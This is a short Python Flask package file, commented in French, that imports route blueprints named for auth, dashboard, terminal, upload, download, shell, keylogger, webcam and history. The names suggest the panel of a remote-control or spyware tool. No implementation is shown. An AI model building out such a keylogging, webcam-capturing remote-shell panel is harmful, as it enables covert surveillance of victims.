from flask import Blueprint

# Importation des blueprints spécifiques
from .auth import auth_bp
from .dashboard import dashboard_bp
from .terminal import terminal_bp
from .upload import upload_bp
from .download import download_bp
from .shell import shell_bp
from .keylogger import keylogger_bp
from .webcam import webcam_bp
from .history import history_bp
